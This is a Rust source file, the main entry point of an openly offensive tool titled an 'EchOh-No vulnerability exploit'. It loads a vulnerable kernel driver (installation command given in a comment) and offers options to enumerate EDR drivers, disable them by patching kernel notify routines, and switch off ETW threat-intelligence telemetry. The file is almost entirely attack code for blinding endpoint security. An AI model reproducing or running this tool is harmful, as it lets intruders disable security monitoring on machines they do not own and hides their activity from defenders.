use clap::Parser;
use env_logger::Env;
use windows_sys::Win32::System::Threading::GetCurrentProcessId;

pub mod driver;
pub mod etw_threat_intel;
pub mod kernel_notify_routine_patching;
pub mod offsets;
pub mod utilities;

use driver::Driver;
use offsets::Offsets;
use utilities::Utils;

use kernel_notify_routine_patching::KernelNotifyRoutine;
use etw_threat_intel::ETWThreat;

struct FoundEdrDrivers {
    driver_name: String,
    routine: String,
    call_back_func: u64,
    call_back_struct: u64,
    call_back_struct_addr: u64,
    removed: bool,
}

/// EchOh-No vulnerability exploit
#[derive(Parser, Debug)]
#[command(author, version, about)]   

struct Args {
    /// Enumerate current loaded EDR drivers using notify routines.
    #[arg(long)]
    enumerate_edr_drivers: bool,

    /// Disable EDR drivers using notify routines.
    #[arg(long)]
    disable_edr_drivers: bool,

    /// Disable ETW
    #[arg(long)]
    disable_etw: bool,
}

// to use:

// sc create EchoDrv binpath=C:\PathToDriver.sys type= kernel && sc start EchoDrv

fn main() {
    unsafe {
        let driver_handle = Driver::load();
        let own_process_handle = Driver::get_handle_pid(driver_handle, GetCurrentProcessId());

        let args = Args::parse();
        env_logger::Builder::from_env(Env::default().default_filter_or("debug")).init();

        if args.enumerate_edr_drivers {
            KernelNotifyRoutine::enumerate(driver_handle, own_process_handle);
        }

        if args.disable_edr_drivers {
            KernelNotifyRoutine::patch(driver_handle, own_process_handle);
        }

        if args.disable_etw {
            ETWThreat::disable(driver_handle, own_process_handle);
        }
    }
}